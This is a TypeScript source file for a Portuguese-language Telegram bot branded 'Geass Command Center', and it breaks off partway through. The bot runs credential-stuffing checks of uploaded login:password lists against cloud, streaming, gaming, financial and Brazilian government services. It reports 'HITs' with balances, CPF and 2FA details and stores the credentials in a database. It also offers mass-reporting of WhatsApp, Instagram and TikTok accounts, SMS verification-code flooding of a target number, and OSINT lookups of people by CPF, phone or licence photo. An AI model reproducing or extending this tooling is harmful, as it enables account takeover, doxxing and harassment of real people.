import { Telegraf, Markup, type Context } from "telegraf";
import { message } from "telegraf/filters";
import { BOT_TOKEN, API_BASE, CHECKER_TARGETS, MINIAPP_URL } from "./config.js";
import { enqueueRequest, getRateLimitRemaining, type QueuePosition } from "./sky-queue.js";

if (!BOT_TOKEN) {
  console.error("❌ TELEGRAM_BOT_TOKEN não configurado.");
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

// ── Types ─────────────────────────────────────────────────────────────────────
interface Session {
  credentials?:   string[];
  activeJobId?:   string;
  hits:           HitEntry[];
  fails:          string[];
  errors:         string[];
  running:        boolean;
  progressMsgId?: number;
  progressChatId?: number;
  abortCtrl?:     AbortController;
  waitingFor?:    "file" | "domain" | null;
  currentLabel?:  string;
  startedAt?:     number;
  totalCreds?:    number;
  waStep?:        "report_number" | "code_number" | "social_url";
  waRunning?:     boolean;
  socialPlatHint?: "instagram" | "tiktok";
}

interface HitEntry {
  credential: string;
  detail:     string;
  target:     string;
  at:         number;
}

const sessions = new Map<number, Session>();
function getSession(userId: number): Session {
  if (!sessions.has(userId)) {
    sessions.set(userId, { hits: [], fails: [], errors: [], running: false });
  }
  return sessions.get(userId)!;
}

// ── Per-user cooldowns para report/sendcode ───────────────────────────────────
const REPORT_COOLDOWN_MS   = 3 * 60 * 1000; // 3 minutos
const SENDCODE_COOLDOWN_MS = 2 * 60 * 1000; // 2 minutos
const reportCooldowns   = new Map<number, number>();
const sendcodeCooldowns = new Map<number, number>();

function checkCooldown(map: Map<number, number>, userId: number, cdMs: number): number {
  const last = map.get(userId) ?? 0;
  return Math.max(0, cdMs - (Date.now() - last));
}
function setCooldown(map: Map<number, number>, userId: number): void {
  map.set(userId, Date.now());
}

// ── Histórico de operações por usuário (últimas 20) ───────────────────────────
interface WaHistoryEntry { type: "report" | "sendcode"; number: string; sent: number; total: number; at: Date }
const waHistory = new Map<number, WaHistoryEntry[]>();
function addWaHistory(userId: number, e: WaHistoryEntry): void {
  const arr = waHistory.get(userId) ?? [];
  arr.push(e);
  if (arr.length > 20) arr.shift();
  waHistory.set(userId, arr);
}

// ── Per-user last check history (in-memory) ───────────────────────────────────
interface TgCheckHistory {
  hits:      HitEntry[];
  fails:     string[];
  errors:    string[];
  label:     string;
  total:     number;
  ts:        Date;
  elapsedMs: number;
  txtBuf:    Buffer;
  fileName:  string;
}
const lastCheckHistoryTg = new Map<number, TgCheckHistory>();

function saveCheckHistory(
  userId:    number,
  label:     string,
  total:     number,
  hits:      HitEntry[],
  fails:     string[],
  errors:    string[],
  elapsedMs: number,
  stopped:   boolean,
) {
  const txtBuf  = buildCheckerTxt(label, total, hits, fails, errors, stopped, elapsedMs);
  const ts      = new Date();
  const safeLbl = label.toLowerCase().replace(/[^a-z0-9]/g, "_");
  const fileName = `checker_${safeLbl}_${ts.toISOString().slice(0, 19).replace(/[:T]/g, "-")}.txt`;
  lastCheckHistoryTg.set(userId, { hits: [...hits], fails: [...fails], errors: [...errors], label, total, ts, elapsedMs, txtBuf, fileName });
}

// ── HTML escape ───────────────────────────────────────────────────────────────
function esc(s: string) {
  return s.replace(/[&<>"']/g, c =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]!));
}

// ── Theme constants ───────────────────────────────────────────────────────────
const LINE  = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
const LINE2 = "────────────────────────────";
const GEASS = "👁";
const SWORD = "⚔️";

// ── Parse checker detail string ───────────────────────────────────────────────
// Detail format examples:
//   "email:x@y.com | plano:premium | país:BR | 2fa:true | repos:42"
//   "saldo:$4.20 | nome:John Doe | desde:2020-01-01"
//   "credenciais_invalidas" (plain error)
interface ParsedDetail {
  pairs: { key: string; value: string }[];
  raw:   string;
}

function parseDetail(raw: string): ParsedDetail {
  const pairs: { key: string; value: string }[] = [];
  const parts = raw.split("|").map(p => p.trim()).filter(Boolean);
  for (const part of parts) {
    const colonIdx = part.indexOf(":");
    if (colonIdx > 0) {
      const key   = part.slice(0, colonIdx).trim();
      const value = part.slice(colonIdx + 1).trim();
      pairs.push({ key, value });
    } else {
      pairs.push({ key: "info", value: part });
    }
  }
  return { pairs, raw };
}

// Map raw key names to pretty labels + emojis
const KEY_LABELS: Record<string, string> = {
  email:       "📧 E-mail",
  login:       "👤 Login",
  nome:        "👤 Nome",
  name:        "👤 Nome",
  plano:       "⭐ Plano",
  plan:        "⭐ Plano",
  tier:        "⭐ Tier",
  país:        "🌍 País",
  country:     "🌍 País",
  saldo:       "💰 Saldo",
  balance:     "💰 Saldo",
  "2fa":       "🔒 2FA",
  mfa:         "🔒 2FA",
  repos:       "📁 Repos",
  gists:       "📝 Gists",
  stars:       "⭐ Stars",
  uid:         "🆔 UID",
  id:          "🆔 ID",
  user_id:     "🆔 ID",
  desde:       "📅 Criado",
  created:     "📅 Criado",
  since:       "📅 Desde",
  expires:     "📅 Expira",
  servers:     "🖥️ Servidores",
  vps:         "🖥️ VPS",
  instances:   "🖥️ Instâncias",
  regions:     "🗺️ Regiões",
  spend:       "💸 Gasto",
  credits:     "💳 Créditos",
  billing:     "💳 Cobrança",
  rank:        "🏆 Rank",
  level:       "📊 Nível",
  robux:       "💎 Robux",
  wallet:      "👛 Carteira",
  games:       "🎮 Jogos",
  followers:   "👥 Seguidores",
  following:   "👥 Seguindo",
  username:    "🏷️ Username",
  account_id:  "🆔 Conta",
  scopes:      "🔑 Escopos",
  tipo:        "📋 Tipo",
  info:        "ℹ️ Info",
  cpf:         "🪪 CPF",
  cnpj:        "🪪 CNPJ",
  dob:         "🎂 Nasc.",
  nascimento:  "🎂 Nasc.",
  owner:       "👤 Owner",
  org:         "🏢 Org",
};

function prettyKey(k: string): string {
  return KEY_LABELS[k.toLowerCase()] ?? `📌 ${k}`;
}

// ── Build individual HIT card (blockquote style) ──────────────────────────────
function buildHitCard(hit: HitEntry): string {
  const [login, ...rest] = hit.credential.split(":");
  const password = rest.join(":");
  const d = parseDetail(hit.detail);
  const ts = new Date(hit.at).toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });

  const lines: string[] = [];

  // Credential line
  lines.push(`🔑 <code>${esc(login ?? hit.credential)}</code>`);
  if (password && password !== hit.detail) {
    lines.push(`🗝️ <code>${esc(password)}</code>`);
  }

  // Detail pairs
  if (d.pairs.length > 0) {
    lines.push(LINE2);
    for (const { key, value } of d.pairs) {
      const label = prettyKey(key);
      const displayVal = value.length > 60 ? value.slice(0, 57) + "..." : value;
      lines.push(`${label}: <b>${esc(displayVal)}</b>`);
    }
  }

  lines.push(LINE2);
  lines.push(`🎯 <b>${esc(hit.target.toUpperCase())}</b>  ·  🕐 ${ts}`);

  return [
    `✅ <b>HIT CONFIRMADO</b>`,
    `<blockquote>${lines.join("\n")}</blockquote>`,
  ].join("\n");
}

// ── Build progress bar ────────────────────────────────────────────────────────
function buildBar(pct: number, size = 14): string {
  const filled = Math.round((pct / 100) * size);
  return `<code>${"█".repeat(filled)}${"░".repeat(size - filled)}</code>`;
}

// ── Build progress message ────────────────────────────────────────────────────
function buildProgress(
  label: string,
  total: number,
  done: number,
  hits: HitEntry[],
  fails: string[],
  errors: string[],
): string {
  const pct = total > 0 ? Math.round((done / total) * 100) : 0;
  const spd = done > 0 ? `${done}/${total}` : `0/${total}`;
  const lines = [
    `${GEASS} <b>OPERAÇÃO EM CURSO</b> ${GEASS}`,
    `<b>Alvo:</b> <code>${esc(label.toUpperCase())}</code>`,
    LINE2,
    `${buildBar(pct)} <b>${pct}%</b>  <code>${spd}</code>`,
    ``,
    `✅ <b>HITs</b>   <code>${hits.length}</code>   ❌ <b>FAILs</b> <code>${fails.length}</code>   ⚡ <b>Erros</b> <code>${errors.length}</code>`,
  ];
  if (hits.length > 0) {
    lines.push(``);
    lines.push(`<b>🎯 Últimos HITs:</b>`);
    hits.slice(-3).forEach(h => {
      const [login] = h.credential.split(":");
      lines.push(`  <code>${esc(login ?? h.credential)}</code>`);
    });
  }
  lines.push(LINE);
  return lines.join("\n");
}

// ── Build final report ────────────────────────────────────────────────────────
function buildFinal(
  label: string,
  total: number,
  hits: HitEntry[],
  fails: string[],
  errors: string[],
  stopped = false,
): string {
  const hitRate = total > 0 ? ((hits.length / total) * 100).toFixed(1) : "0.0";
  const lines = [
    stopped
      ? `🛑 <b>GEASS SUSPENSO</b>`
      : `✅ <b>GEASS CONCLUÍDO</b>`,
    `<code>${esc(label.toUpperCase())}</code>`,
    LINE2,
    `📊 Total: <b>${total}</b>  ·  Taxa HIT: <b>${hitRate}%</b>`,
    ``,
    `✅ HITs:  <b>${hits.length}</b>   ❌ FAILs: <b>${fails.length}</b>   ⚡ Erros: <b>${errors.length}</b>`,
  ];
  if (hits.length > 0) {
    lines.push(``);
    lines.push(`<b>🎯 Primeiros HITs:</b>`);
    hits.slice(0, 5).forEach(h => {
      const [login] = h.credential.split(":");
      const d = parseDetail(h.detail);
      const planPair = d.pairs.find(p => ["plano", "plan", "tier"].includes(p.key.toLowerCase()));
      const suffix = planPair ? ` · <i>${esc(planPair.value)}</i>` : "";
      lines.push(`  <code>${esc(login ?? h.credential)}</code>${suffix}`);
    });
  }
  lines.push(``);
  lines.push(LINE);
  if (hits.length > 0) {
    lines.push(`<i>Use os botões abaixo para ver todos os HITs.</i>`);
  }
  return lines.join("\n");
}

// ── Session status ────────────────────────────────────────────────────────────
function sessionStatusMsg(s: Session): string {
  const credCount = s.credentials?.length ?? 0;
  return [
    `${GEASS} <b>STATUS DA SESSÃO</b>`,
    LINE2,
    ``,
    `🔑 Credenciais: <b>${credCount.toLocaleString("pt-BR")}</b>`,
    `⚙️ Checker: <b>${s.running ? `🟢 ATIVO — ${esc(s.currentLabel ?? "")}` : "🔴 Parado"}</b>`,
    ``,
    `✅ HITs:   <b>${s.hits.length}</b>`,
    `❌ FAILs:  <b>${s.fails.length}</b>`,
    `⚡ Erros:  <b>${s.errors.length}</b>`,
    ``,
    LINE,
  ].join("\n");
}

// ── Edit helper ───────────────────────────────────────────────────────────────
async function editMsg(
  ctx: Context,
  chatId: number,
  msgId: number,
  text: string,
  extra?: Parameters<typeof ctx.telegram.editMessageText>[4],
) {
  try {
    await ctx.telegram.editMessageText(chatId, msgId, undefined, text, {
      parse_mode: "HTML",
      ...extra,
    });
  } catch { /* ignore edit conflicts */ }
}

// ── Home screen ───────────────────────────────────────────────────────────────
function homeMsg(name: string): string {
  return [
    `${GEASS} <b>GEASS COMMAND CENTER</b> ${GEASS}`,
    `<i>All hail Lelouch vi Britannia</i>`,
    LINE2,
    ``,
    `Bem-vindo, <b>${esc(name)}</b>.`,
    `O poder do Geass responde às suas ordens.`,
    ``,
    LINE,
    `${SWORD} Escolha sua operação abaixo.`,
  ].join("\n");
}

function homeKeyboard() {
  const rows = [
    [
      Markup.button.callback(`${SWORD} Checar Creds`,  "home_checker"),
      Markup.button.callback("🔍 Buscar Domínio",      "home_url"),
    ],
    [
      Markup.button.callback("📊 Stats do Banco",      "home_stats"),
      Markup.button.callback("🎯 Ver HITs",            "home_hits"),
    ],
    [
      Markup.button.callback("📜 Histórico",           "home_historico"),
      Markup.button.callback("📋 Status Sessão",       "home_status"),
    ],
    [
      Markup.button.callback("🚩 Report WA",           "home_wa_report"),
      Markup.button.callback("📲 Código SMS",          "home_wa_code"),
    ],
    [
      Markup.button.callback("📢 Report Redes",        "home_social_report"),
      Markup.button.callback("🗑 Limpar Sessão",       "home_clear"),
    ],
  ];
  if (MINIAPP_URL) {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    rows.push([Markup.button.webApp("📲 Abrir Painel Geass", MINIAPP_URL)] as any);
  }
  return Markup.inlineKeyboard(rows);
}

// ── Target menu keyboard ──────────────────────────────────────────────────────
// Groups targets by category, 2 per row, with a header "button" for each cat.
function buildTargetKeyboard() {
  const cats: Record<string, { id: string; label: string }[]> = {};
  CHECKER_TARGETS.forEach(t => { (cats[t.cat] ??= []).push({ id: t.id, label: t.label }); });

  const catEmoji: Record<string, string> = {
    "Dev / Cloud":   "☁️",
    "VPS / Hosting": "🖥️",
    "Streaming":     "🎬",
    "Gaming":        "🎮",
    "Financeiro":    "💳",
    "Social":        "📱",
    "Governo BR":    "🏛️",
  };

  const rows: ReturnType<typeof Markup.button.callback>[][] = [];

  Object.entries(cats).forEach(([cat, targets]) => {
    // Category header — non-interactive (callback answers empty)
    rows.push([
      Markup.button.callback(`${catEmoji[cat] ?? "▸"} ${cat.toUpperCase()}`, `cat_noop_${cat}`),
    ]);
    // Targets: 2 per row
    for (let i = 0; i < targets.length; i += 2) {
      const pair = targets.slice(i, i + 2).map(t => Markup.button.callback(t.label, `target_${t.id}`));
      rows.push(pair);
    }
  });

  rows.push([Markup.button.callback("↩ Cancelar", "go_home")]);
  return Markup.inlineKeyboard(rows);
}

async function showTargetMenu(ctx: Context, count: number, domain?: string) {
  await ctx.replyWithHTML(
    [
      `${SWORD} <b>ESCOLHA O ALVO</b>`,
      LINE2,
      domain ? `🔍 Domínio: <code>${esc(domain)}</code>` : null,
      `📋 <b>${count.toLocaleString("pt-BR")}</b> credenciais prontas`,
      LINE,
    ].filter(Boolean).join("\n"),
    buildTargetKeyboard(),
  );
}

// ── Category noop handler ─────────────────────────────────────────────────────
bot.action(/^cat_noop_/, async ctx => {
  await ctx.answerCbQuery();
});

// ── /start ────────────────────────────────────────────────────────────────────
bot.start(async ctx => {
  const name = ctx.from?.first_name ?? "Operador";
  await ctx.replyWithHTML(homeMsg(name), homeKeyboard());
});

bot.command("home", async ctx => {
  const name = ctx.from?.first_name ?? "Operador";
  await ctx.replyWithHTML(homeMsg(name), homeKeyboard());
});

// ── /help ─────────────────────────────────────────────────────────────────────
bot.command("help", async ctx => {
  await ctx.replyWithHTML([
    `${GEASS} <b>ORDENS DO GEASS</b>`,
    LINE2,
    ``,
    `<b>🔧 Controle:</b>`,
    `/start    — Painel principal`,
    `/status   — Status da sessão`,
    `/stop     — Parar checker ativo`,
    `/clear    — Limpar sessão`,
    ``,
    `<b>${SWORD} Checker:</b>`,
    `/checker  — Iniciar checker (envie .txt)`,
    `/url &lt;domínio&gt; — Buscar no banco e checar`,
    `/import   — Importar credenciais para o banco`,
    ``,
    `<b>📊 Resultados:</b>`,
    `/hits      — Ver HITs da sessão atual`,
    `/historico — TXT do último check (anterior)`,
    `/fails    — Ver FAILs da sessão`,
    `/errors   — Ver erros da sessão`,
    `/stats    — Estatísticas do banco`,
    ``,
    `<b>🚩 WhatsApp:</b>`,
    `/reportwa &lt;número&gt; [qty] — Reportar número WhatsApp`,
    `  Ex: <code>/reportwa 5511999887766 20</code>`,
    `  • DDI+DDD+número sem espaços | Máx: 200 | Cooldown: 3 min`,
    `/sendcode &lt;número&gt; — Enviar códigos de verificação SMS`,
    `  Ex: <code>/sendcode 5511999887766</code>`,
    `  • 22 serviços: Telegram, iFood, Rappi, PicPay, Nubank…`,
    ``,
    `<b>📢 Redes Sociais:</b>`,
    `/reportredes &lt;URL&gt; [qty] — Reportar conta/post no Instagram ou TikTok`,
    `  📸 IG conta: <code>/reportredes https://instagram.com/alvo 10</code>`,
    `  📸 IG post:  <code>/reportredes https://instagram.com/p/ABC123/ 5</code>`,
    `  🎵 TK conta: <code>/reportredes https://tiktok.com/@alvo 8</code>`,
    `  🎵 TK vídeo: <code>/reportredes https://tiktok.com/@alvo/video/ID 8</code>`,
    `  💡 Sem URL: mostra seletor de plataforma (📸 / 🎵)`,
    ``,
    `<b>🕵️ OSINT:</b>`,
    `/osint &lt;tipo&gt; &lt;dado&gt; — Consulta via GeassZero + DarkFlow`,
    `  🪪 CPF:      <code>/osint cpf 12345678901</code>`,
    `  🚗 Placa:    <code>/osint placa ABC1D23</code>`,
    `  📱 Telefone: <code>/osint telefone 11999887766</code>`,
    `  👤 Nome:     <code>/osint nome João Silva</code>`,
    `  📧 Email:    <code>/osint email addr@mail.com</code>`,
    `  📸 Foto CNH: <code>/osint foto 12345678901</code>`,
    `  💡 Use <code>/osint</code> sem args para ver todos os tipos`,
    ``,
    LINE,
    `<i>💡 Envie um .txt com <code>login:senha</code> por linha para carregar credenciais.</i>`,
  ].join("\n"), Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]));
});

// ── /stats ────────────────────────────────────────────────────────────────────
bot.command("stats",     async ctx => { await showStats(ctx); });
bot.action("home_stats", async ctx => { await ctx.answerCbQuery(); await showStats(ctx); });

async function showStats(ctx: Context) {
  try {
    const r    = await fetch(`${API_BASE}/api/credentials/stats`);
    const data = await r.json() as { total: number; topDomains: { domain: string; count: number }[] };
    const domains = (data.topDomains ?? []).slice(0, 8)
      .map((d, i) => `  ${i + 1}. <code>${esc(d.domain)}</code> — <b>${d.count}</b>`)
      .join("\n");
    await ctx.replyWithHTML([
      `${GEASS} <b>BANCO DE CREDENCIAIS</b>`,
      LINE2,
      ``,
      `📦 Total: <b>${data.total.toLocaleString("pt-BR")}</b> credenciais`,
      ``,
      `<b>🔝 Top Domínios:</b>`,
      domains || `  <i>Nenhum ainda</i>`,
      ``,
      LINE,
    ].join("\n"), Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]));
  } catch (e) {
    await ctx.reply(`❌ Erro: ${String(e)}`);
  }
}

// ── /hits ─────────────────────────────────────────────────────────────────────
bot.command("hits",     async ctx => { await showHits(ctx, getSession(ctx.from!.id)); });
bot.action("home_hits", async ctx => { await ctx.answerCbQuery(); await showHits(ctx, getSession(ctx.from!.id)); });

async function showHits(ctx: Context, s: Session) {
  if (s.hits.length === 0) {
    await ctx.replyWithHTML(
      `${GEASS} <b>HITs</b>\n${LINE2}\n\n<i>Nenhum HIT ainda nesta sessão.</i>\n${LINE}`,
      Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
    );
    return;
  }

  const preview = s.hits.slice(0, 30).map(h => {
    const [login] = h.credential.split(":");
    const d = parseDetail(h.detail);
    const planPair = d.pairs.find(p => ["plano", "plan", "tier"].includes(p.key.toLowerCase()));
    const extra = planPair ? ` · ${esc(planPair.value)}` : (d.pairs[0] ? ` · ${esc(d.pairs[0].value)}` : "");
    return `✅ <code>${esc(login ?? h.credential)}</code>${extra}`;
  }).join("\n");

  await ctx.replyWithHTML(
    [
      `✅ <b>HITs (${s.hits.length})</b>`,
      LINE2,
      ``,
      preview,
      s.hits.length > 30 ? `\n<i>... e mais ${s.hits.length - 30} HITs</i>` : "",
      ``,
      LINE,
    ].join("\n"),
    Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
  );
}

// ── /historico ────────────────────────────────────────────────────────────────
bot.command("historico",     async ctx => { await showHistorico(ctx); });
bot.action("home_historico", async ctx => { await ctx.answerCbQuery(); await showHistorico(ctx); });

async function showHistorico(ctx: Context) {
  const userId = ctx.from?.id;
  if (!userId) return;
  const hist = lastCheckHistoryTg.get(userId);

  if (!hist) {
    await ctx.replyWithHTML(
      `📜 <b>Histórico Anterior</b>\n${LINE2}\n\n<i>Nenhum check anterior encontrado nesta sessão.\nInicie um check e os resultados ficam guardados aqui.</i>\n${LINE}`,
      Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
    );
    return;
  }

  const ts      = hist.ts.toLocaleString("pt-BR", { hour12: false });
  const elapsed = Math.round(hist.elapsedMs / 1000);
  const elStr   = elapsed >= 60 ? `${Math.floor(elapsed / 60)}m${elapsed % 60}s` : `${elapsed}s`;

  await ctx.replyWithHTML(
    [
      `📜 <b>Histórico — ${esc(hist.label.toUpperCase())}</b>`,
      LINE2,
      ``,
      `🗓 <b>Data:</b> <code>${ts}</code>`,
      `📦 <b>Total checado:</b> <code>${hist.total}</code>`,
      `⏱ <b>Duração:</b> <code>${elStr}</code>`,
      ``,
      `✅ <b>HITs:</b> <code>${hist.hits.length}</code>`,
      `❌ <b>FAILs:</b> <code>${hist.fails.length}</code>`,
      `⚠️ <b>Erros:</b> <code>${hist.errors.length}</code>`,
      ``,
      LINE,
      `<i>O arquivo completo com todos os resultados será enviado abaixo.</i>`,
    ].join("\n"),
    Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
  );

  // Send the TXT that was stored when the check finished
  await bot.telegram.sendDocument(
    ctx.chat!.id,
    { source: hist.txtBuf, filename: hist.fileName },
    { caption: `📜 Histórico: <b>${esc(hist.label.toUpperCase())}</b> — ${esc(ts)}`, parse_mode: "HTML" },
  );
}

// ── /fails ────────────────────────────────────────────────────────────────────
bot.command("fails", async ctx => {
  const s = getSession(ctx.from!.id);
  if (s.fails.length === 0) { await ctx.reply("Nenhum FAIL na sessão atual."); return; }
  const text = s.fails.slice(0, 50).map(f => `❌ <code>${esc(f)}</code>`).join("\n");
  await ctx.replyWithHTML(
    `❌ <b>FAILs (${s.fails.length})</b>\n${LINE2}\n\n${text}`,
    Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
  );
});

// ── /errors ───────────────────────────────────────────────────────────────────
bot.command("errors", async ctx => {
  const s = getSession(ctx.from!.id);
  if (s.errors.length === 0) { await ctx.reply("Nenhum erro na sessão atual."); return; }
  const text = s.errors.slice(0, 50).map(e => `⚡ <code>${esc(e)}</code>`).join("\n");
  await ctx.replyWithHTML(
    `⚡ <b>Erros (${s.errors.length})</b>\n${LINE2}\n\n${text}`,
    Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
  );
});

// ── /status ───────────────────────────────────────────────────────────────────
bot.command("status",    async ctx => { const s = getSession(ctx.from!.id); await ctx.replyWithHTML(sessionStatusMsg(s), Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]])); });
bot.action("home_status",async ctx => { await ctx.answerCbQuery(); const s = getSession(ctx.from!.id); await ctx.replyWithHTML(sessionStatusMsg(s), Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]])); });

// ── /clear ────────────────────────────────────────────────────────────────────
bot.command("clear",    async ctx => { await doClear(ctx, getSession(ctx.from!.id)); });
bot.action("home_clear", async ctx => {
  await ctx.answerCbQuery();
  const s = getSession(ctx.from!.id);
  if (s.running) { await ctx.answerCbQuery("⚠️ Pare o checker primeiro!"); return; }
  await doClear(ctx, s);
});

async function doClear(ctx: Context, s: Session) {
  if (s.running) { await ctx.reply("⚠️ Pare o checker antes de limpar (/stop)."); return; }
  s.credentials = undefined;
  s.hits = []; s.fails = []; s.errors = [];
  s.activeJobId = undefined; s.waitingFor = null; s.currentLabel = undefined;
  await ctx.replyWithHTML(
    `🗑 <b>SESSÃO LIMPA</b>\n${LINE2}\n\nCredenciais e resultados apagados.\n${LINE}`,
    Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
  );
}

// ── /stop ─────────────────────────────────────────────────────────────────────
bot.command("stop", async ctx => {
  const s = getSession(ctx.from!.id);
  if (!s.running) { await ctx.reply("Nenhum checker ativo."); return; }
  await stopChecker(ctx, s, true);
});

bot.action("stop_checker", async ctx => {
  await ctx.answerCbQuery("🛑 Parando...");
  const s = getSession(ctx.from!.id);
  if (!s.running) return;
  await stopChecker(ctx, s, true);
});

async function stopChecker(ctx: Context, s: Session, byUser = false) {
  s.abortCtrl?.abort("user_stop");
  s.running = false;
  if (s.activeJobId) {
    await fetch(`${API_BASE}/api/checker/${s.activeJobId}`, { method: "DELETE" }).catch(() => {});
  }
  if (s.progressChatId && s.progressMsgId) {
    const total     = s.totalCreds ?? (s.hits.length + s.fails.length + s.errors.length);
    const elapsedMs = s.startedAt ? Date.now() - s.startedAt : 0;
    const label     = s.currentLabel ?? "checker";
    const text      = buildFinal(label, total, s.hits, s.fails, s.errors, byUser);
    await editMsg(ctx, s.progressChatId, s.progressMsgId, text,
      Markup.inlineKeyboard([
        [Markup.button.callback("✅ Ver HITs", "home_hits"), Markup.button.callback("📊 Stats", "home_stats")],
        [Markup.button.callback("🏠 Início",   "go_home")],
      ]),
    );
    // Always send full TXT even when user stopped manually
    await sendResultsTxt(ctx, s.progressChatId, label, total, s.hits, s.fails, s.errors, byUser, elapsedMs);
    // Save to per-user history (only if there's data worth storing)
    if (ctx.from?.id && (s.hits.length + s.fails.length + s.errors.length) > 0) {
      saveCheckHistory(ctx.from.id, label, total, s.hits, s.fails, s.errors, elapsedMs, byUser);
    }
  }
}

// ── /import ───────────────────────────────────────────────────────────────────
bot.command("import", async ctx => {
  const s = getSession(ctx.from!.id);
  s.waitingFor = "file";
  await ctx.replyWithHTML(
    `💾 <b>IMPORTAR CREDENCIAIS</b>\n${LINE2}\n\nEnvie um arquivo <b>.txt</b> com credenciais\n(<code>login:senha</code> por linha).`,
    Markup.inlineKeyboard([[Markup.button.callback("↩ Cancelar", "go_home")]]),
  );
});

// ── /checker ──────────────────────────────────────────────────────────────────
bot.command("checker", async ctx => {
  const s = getSession(ctx.from!.id);
  if (s.running) { await ctx.reply("⚠️ Já existe um checker ativo. Use /stop primeiro."); return; }
  if (s.credentials?.length) {
    await showTargetMenu(ctx, s.credentials.length);
  } else {
    s.waitingFor = "file";
    await ctx.replyWithHTML(
      `${SWORD} <b>GEASS CHECKER</b>\n${LINE2}\n\nEnvie um arquivo <b>.txt</b> com credenciais\n(<code>login:senha</code> por linha).`,
      Markup.inlineKeyboard([[Markup.button.callback("↩ Cancelar", "go_home")]]),
    );
  }
});

// ── /sky e /lelouch — IA via SkyNetChat ──────────────────────────────────────

/** Build the queue-position message text (HTML for Telegram) */
function buildSkyQueueText(pos: QueuePosition, qPreview: string): string {
  if (pos.isRunning) {
    return [
      `🛰️ <b>SKYNETCHAT</b>`,
      LINE2,
      ``,
      `💬 <b>Sua pergunta:</b>`,
      `<blockquote>${esc(qPreview)}</blockquote>`,
      ``,
      `⚡ <b>Sua vez! Processando requisição...</b>`,
      `<i>A IA está gerando sua resposta, aguarde.</i>`,
    ].join("\n");
  }

  const totalWaiting = pos.total - pos.running;
  const BAR_LEN = 10;
  const filled  = Math.max(1, BAR_LEN - Math.round(((pos.waitPos - 1) / Math.max(totalWaiting - 1, 1)) * BAR_LEN));
  const bar     = `[${"█".repeat(filled)}${"░".repeat(BAR_LEN - filled)}]`;

  return [
    `🛰️ <b>SKYNETCHAT — FILA</b>`,
    LINE2,
    ``,
    `💬 <b>Sua pergunta:</b>`,
    `<blockquote>${esc(qPreview)}</blockquote>`,
    ``,
    `📋 <b>Você está na fila de requisições</b>`,
    ``,
    `🎫 Posição: <b>#${pos.waitPos}</b> de ${totalWaiting} aguardando`,
    `👥 À sua frente: <b>${pos.ahead}</b>`,
    `⚡ Processando agora: <b>${pos.running}</b>`,
    ``,
    `<code>${bar}</code>  <i>${pos.waitPos}/${totalWaiting}</i>`,
    ``,
    `<i>Aguarde sua vez — a resposta chegará em breve...</i>`,
  ].join("\n");
}

async function handleAiCommand(ctx: Context, question: string) {
  if (!question.trim()) {
    await ctx.replyWithHTML(
      `🛰️ <b>SKYNETCHAT — IA</b>\n${LINE2}\n\n` +
      `<i>Envie sua pergunta logo após o comando:</i>\n` +
      `<code>/sky Qual a capital do Brasil?</code>\n` +
      `<code>/lelouch Explique HTTP/2 Rapid Reset</code>`,
    );
    return;
  }

  const userId = String(ctx.from?.id ?? "unknown");

  // ── Rate limit ────────────────────────────────────────────────────────────
  const rlMs = getRateLimitRemaining(userId);
  if (rlMs > 0) {
    const secsLeft = Math.ceil(rlMs / 1000);
    await ctx.replyWithHTML(
      `🛰️ <b>SKYNETCHAT — AGUARDE</b>\n${LINE2}\n\n` +
      `⏳ Você usou o <code>/sky</code> recentemente.\n\n` +
      `Aguarde mais <b>${secsLeft}s</b> antes de enviar outra pergunta.\n` +
      `<i>O rate limit evita esgotar os tokens da conta.</i>`,
    ).catch(() => {});
    return;
  }

  const qPreview = question.length > 220 ? question.slice(0, 217) + "…" : question;

  // ── Send initial queue message ────────────────────────────────────────────
  const waitMsg = await ctx.replyWithHTML(
    buildSkyQueueText({ waitPos: 1, ahead: 0, total: 1, running: 0, isRunning: false }, qPreview),
  ).catch(() => null);

  if (!waitMsg) return;
  const chatId = waitMsg.chat.id;
  const msgId  = waitMsg.message_id;

  const start = Date.now();
  let reply: string | null = null;

  try {
    reply = await enqueueRequest(
      userId,
      async () => {
        const r = await fetch(`${API_BASE}/api/skynetchat/ask`, {
          method:  "POST",
          headers: { "Content-Type": "application/json" },
          body:    JSON.stringify({ message: question }),
          signal:  AbortSignal.timeout(90_000),
        });
        const data = await r.json() as { reply?: string; error?: string; message?: string };
        if (!r.ok || !data.reply) return null;
        return data.reply;
      },
      async (pos) => {
        await editMsg(ctx, chatId, msgId, buildSkyQueueText(pos, qPreview));
      },
    );
  } catch {
    await editMsg(ctx, chatId, msgId,
      `🛰️ <b>SKYNETCHAT — TIMEOUT</b>\n${LINE2}\n\n❌ A IA demorou muito para responder.`,
      Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
    );
    return;
  }

  const elapsed = Date.now() - start;

  if (!reply) {
    await editMsg(ctx, chatId, msgId,
      `🛰️ <b>SKYNETCHAT — ERRO</b>\n${LINE2}\n\n` +
      `❌ SKYNETchat não retornou resposta.\n` +
      `<i>Cookie pode estar expirado ou API offline.</i>`,
      Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
    );
    return;
  }

  const formatted = esc(reply.slice(0, 3500))
    .replace(/\*\*(.+?)\*\*/g, "<b>$1</b>")
    .replace(/\*(.+?)\*/g, "<i>$1</i>")
    .replace(/`(.+?)`/g, "<code>$1</code>");

  const lines = [
    `🛰️ <b>SKYNETCHAT</b>`,
    LINE2,
    ``,
    `💬 <b>Pergunta:</b>`,
    `<blockquote>${esc(qPreview)}</blockquote>`,
    ``,
    `🤖 <b>Resposta:</b>`,
    ``,
    formatted,
  ];

